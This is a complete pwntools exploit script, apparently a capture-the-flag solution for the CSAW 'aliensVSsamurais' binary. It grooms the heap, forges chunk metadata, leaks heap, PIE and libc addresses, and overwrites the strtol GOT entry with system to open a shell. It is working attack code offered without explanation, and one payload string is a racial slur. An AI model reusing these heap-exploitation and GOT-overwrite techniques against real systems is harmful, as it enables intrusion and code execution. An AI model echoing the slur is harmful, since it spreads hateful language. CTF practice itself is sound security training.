from pwn import *

def createsam(name):
	r.sendline("1")
	r.recvuntil("?")
	r.send(name)
	r.recvuntil("ka?")

def freesam(index):
	r.sendline("2")
	r.recvuntil("?")
	r.sendline(str(index))
	r.recvuntil("ka?")

def createalien(length, name):
	r.sendline("1")
	r.recvuntil("?")
	r.sendline(str(length))
	r.recvuntil("?")
	r.send(name)
	r.recvuntil("today.")

def freealien(index):
	r.sendline("2")
	r.recvuntil("?")
	r.sendline(str(index))
	r.recvuntil("today.")

def renamealien(index, newname):
	r.sendline("3")
	r.recvuntil("?")
	r.sendline(str(index))
	r.recvuntil("rename ")
	prev = r.recvuntil(" to?").strip(" to?")
	r.send(newname)
	r.recvuntil("today.")
	return prev


def nextstage():
	r.sendline("3")
	r.recvuntil("today.")

#r = process("./aliensVSsamurais", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("pwn.chal.csaw.io", 9004)

r.recvuntil("ka?")

for i in range(0xc8):
	print i
	createsam("A"*7 + "\n")

createsam("\n")
createsam("\n")

nextstage()

createalien(0x88, "\n") #0
createalien(0x88, "\n") #1
createalien(0x88, "\n") #2
createalien(0x88, "\n") #3
createalien(0x88, "\n") #4
createalien(0x88, "\n") #5
createalien(0x88, "\n") #6
createalien(0x88, "\n") #7
createalien(0x88, "\n") #8
createalien(0x88, "\n") #9
createalien(0x88, "\n") #10
createalien(0x88, "\n") #11
createalien(0x88, "\n") #12

freealien(0)
createalien(0x98 + 0x398, "A"*(20)) #13

freealien(1)
createalien(0x98*2, "B"*(20)) #14

freealien(2)
createalien(0x98*2, "C"*(20)) #15 dummy


freealien(13)

freealien(3)
createalien(0x98, "A" * 0x90 + p64(0xa0)) #16

#freealien(4)
createalien(0x98, "C"*20) #17

freealien(5)
createalien(0x98, "D"*20) #18

freealien(17)
freealien(14)

createalien(0x98, "EEEEE") #19
createalien(0x98, "FFFFF") #20
createalien(0x98, "GGGGG") #21
createalien(0x98, "HHHHH") #22

heap = u64(renamealien(18, "NIGGER").ljust(8, "\x00"))

bssaddrlocation = heap - 0x2390 + 0x20

print hex(heap)

createalien(0x98, "I"*8 + p64(bssaddrlocation) + p64(0x10) + "\n") #22

fakechunkloc = heap + 0xc8

renamealien(600, p64(fakechunkloc)[:-1])

pieleak = u64(renamealien(400, "AAAAAAAA").ljust(8, "\x00"))
print "pie: " + hex(pieleak)

piebase = pieleak - 0x202708
readgot = piebase + 0x202038
freegot = piebase + 0x202018

print "piebase: " + hex(piebase)

createalien(0x98, "I"*8 + p64(freegot) + p64(0x10) + "\n") #23

fakechunkloc = heap + 0x188
renamealien(600, p64(fakechunkloc)[:-1])
libcleak = u64(renamealien(400, "\n").ljust(8, "\x00"))

print "libcleak: " + hex(libcleak)

libcbase = libcleak - 0x844f0

strtolgot = piebase + 0x202058
system = libcbase + 0x45390

createalien(0x98, "I"*8 + p64(strtolgot) + p64(0x10) + "\n") #24
fakechunkloc = heap + 0x248
renamealien(600, p64(fakechunkloc)[:-1])
renamealien(400, p64(system))



r.interactive()
